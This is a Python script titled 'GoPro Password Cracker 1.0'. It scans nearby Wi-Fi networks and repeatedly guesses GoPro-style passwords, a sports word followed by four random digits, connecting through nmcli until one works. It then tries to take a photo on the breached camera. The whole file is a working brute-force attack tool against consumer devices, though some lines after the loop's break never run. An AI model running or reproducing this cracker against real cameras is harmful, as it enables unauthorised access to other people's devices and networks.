import os
import random
import json
import pandas
from wifi import Cell, Scheme
import time
import subprocess
from goprocam import GoProCamera, constants

#generates GoPro-like passwords and attempts to connect.

def gen_part1():
	gopro_words=["sports","hike","vault","skate","share","sail","sled","wave","dive","scuba","dude","sport","canoe","tennis","action"] #more words needed!
	sports=open("sportslist.txt", "r").read().split(",")
	dictionary1 = gopro_words + sports
	dictionary2=pandas.unique(dictionary1).tolist()
	return random.choice(gopro_words)
def gen_part2():
	sequence = ""
	for _ in range(4):
			sequence += str(random.randint(0,9))
	return sequence

def connect(ssid, password):
	connection = subprocess.run(['nmcli', '-w','10','dev', 'wifi', 'connect', ssid, 'password', password], stdout=subprocess.PIPE)
	return connection.stdout.decode('utf-8')

found = False

print("GoPro Password Cracker 1.0")
print("Attempts to guess the password of a GoPro camera via dictionary attack and connect to it.")
networks=Cell.all('wlp6s0')
networks_list=[]
for index, i in enumerate(networks):
	print("[{}] {}".format(index, i.ssid))
	networks_list.append(i.ssid)
choice=int(input("Enter GoPro SSID: "))
ssid_to_crack=networks_list[choice]
while found == False:
	guess = gen_part1() + gen_part2()
	print("Trying...",guess)
	attempt=connect(ssid_to_crack, guess)
	print(attempt)
	if "Error: No network with SSID" in attempt:
		print(">> Network not found...")
		time.sleep(1)
	if "successfully activated with" in attempt:
		break
		print("We're in!")
		print("Password ", guess)
		gopro = GoProCamera.GoPro()
		gopro.take_photo()
